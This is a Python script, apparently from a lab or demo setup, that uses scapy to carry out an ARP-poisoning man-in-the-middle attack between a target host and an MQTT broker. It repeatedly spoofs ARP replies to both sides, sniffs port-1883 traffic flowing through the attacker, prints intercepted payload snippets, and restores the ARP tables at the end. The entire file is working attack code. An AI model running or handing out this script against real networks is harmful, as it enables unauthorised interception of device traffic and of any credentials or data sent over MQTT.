#!/usr/bin/env python3
"""
MITM — ARP cache poisoning + live MQTT traffic interception.

Convinces the victim and the broker that the attacker is the other party,
so their MQTT traffic flows THROUGH this bot. The bot then sniffs that
traffic and prints proof of interception — visible MQTT messages it
shouldn't have been able to see.

Usage: python mitm.py [victim_ip] [broker_ip] [duration_secs]
Default: victim=192.168.1.195  broker=192.168.1.193  duration=30
"""
import sys, time, signal, threading
from scapy.all import (ARP, Ether, srp, send, sniff, IP, TCP,
                       Raw, conf)

victim   = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.195"
broker   = sys.argv[2] if len(sys.argv) > 2 else "192.168.1.193"
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 30

_state = {
    "running":      True,
    "intercepted":  0,
    "v_to_b_bytes": 0,
    "b_to_v_bytes": 0,
}


def _shutdown(signum, frame):
    print(f"\n[mitm] signal {signum} received — stopping", flush=True)
    _state["running"] = False


signal.signal(signal.SIGTERM, _shutdown)
signal.signal(signal.SIGINT,  _shutdown)


def mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 timeout=2, verbose=0)
    for _, r in ans:
        return r.hwsrc
    return None


def poison(target_ip, target_mac, impersonate_ip):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
             psrc=impersonate_ip), verbose=0)


def restore(t1_ip, t1_mac, t2_ip, t2_mac):
    send(ARP(op=2, pdst=t1_ip, hwdst=t1_mac,
             psrc=t2_ip, hwsrc=t2_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=t2_ip, hwdst=t2_mac,
             psrc=t1_ip, hwsrc=t1_mac), count=5, verbose=0)


def packet_logger(pkt):
    """Called by scapy.sniff for every MQTT-port packet that arrives."""
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return
    ip  = pkt[IP]
    tcp = pkt[TCP]
    if tcp.dport != 1883 and tcp.sport != 1883:
        return
    if ip.src == broker or ip.dst == broker:
        size = len(bytes(tcp.payload))
        _state["intercepted"] += 1
        if ip.src == victim and ip.dst == broker:
            _state["v_to_b_bytes"] += size
            arrow = "VICTIM → BROKER"
        elif ip.src == broker and ip.dst == victim:
            _state["b_to_v_bytes"] += size
            arrow = "BROKER → VICTIM"
        else:
            arrow = f"{ip.src} → {ip.dst}"
        # Only print every 5th packet to keep the log readable
        if _state["intercepted"] % 5 == 1:
            payload = bytes(tcp.payload)[:32]
            hex_dump = payload.hex()
            ascii_dump = "".join(
                c if 32 <= ord(c) < 127 else "."
                for c in payload.decode("latin-1")
            )
            print(f"  [#{_state['intercepted']:04d}] {arrow}  "
                  f"{size}B  payload={ascii_dump!r}",
                  flush=True)


def sniffer_loop():
    """Background thread that captures all MQTT-port traffic on eth0."""
    sniff(filter="tcp and port 1883",
          prn=packet_logger,
          store=False,
          stop_filter=lambda x: not _state["running"])


if __name__ == "__main__":
    print(f"[mitm] resolving MACs ...", flush=True)
    vmac = mac(victim)
    bmac = mac(broker)
    if not vmac or not bmac:
        print(f"[mitm] failed — could not resolve MACs "
              f"(victim={vmac}, broker={bmac})", flush=True)
        sys.exit(1)
    print(f"[mitm] ★ attacking — ARP-poisoning the path between "
          f"victim and broker", flush=True)
    print(f"[mitm]   victim {victim} ({vmac})", flush=True)
    print(f"[mitm]   broker {broker} ({bmac})", flush=True)
    print(f"[mitm]   duration {duration}s — all MQTT traffic "
          f"between them will flow through us", flush=True)

    sniff_thread = threading.Thread(target=sniffer_loop, daemon=True)
    sniff_thread.start()

    end_time = time.time() + duration
    n = 0
    try:
        while _state["running"] and time.time() < end_time:
            poison(victim, vmac, broker)
            poison(broker, bmac, victim)
            n += 2
            if n % 10 == 0:
                print(f"  ARP spoofs sent={n}  |  MQTT packets "
                      f"intercepted={_state['intercepted']}  "
                      f"(V→B {_state['v_to_b_bytes']}B, "
                      f"B→V {_state['b_to_v_bytes']}B)",
                      flush=True)
            time.sleep(1)
    finally:
        _state["running"] = False
        print(f"[mitm] restoring ARP tables ...", flush=True)
        try:
            restore(victim, vmac, broker, bmac)
        except Exception as e:
            print(f"[mitm] restore error: {e}", flush=True)
        time.sleep(1)
        print(f"[mitm] FINAL — {n} ARP spoofs sent · "
              f"{_state['intercepted']} MQTT packets intercepted · "
              f"V→B {_state['v_to_b_bytes']} bytes · "
              f"B→V {_state['b_to_v_bytes']} bytes",
              flush=True)
